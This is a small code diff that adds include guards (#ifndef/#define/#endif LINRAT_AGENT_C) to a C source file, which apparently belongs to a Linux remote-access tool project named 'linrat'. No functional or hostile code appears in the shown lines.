@@ -11,6 +11,10 @@
 /*=======================================*/
 
 
+#ifndef LINRAT_AGENT_C
+#define LINRAT_AGENT_C
+
+
 /* GitHub: https://github.com/vk-candpython/linrat
 
 REQUIREMENTS (
@@ -138,3 +142,4 @@ VOID _start(VOID) {
     );
     GCC_UNREACHABLE_();
 }
+#endif /* LINRAT_AGENT_C */
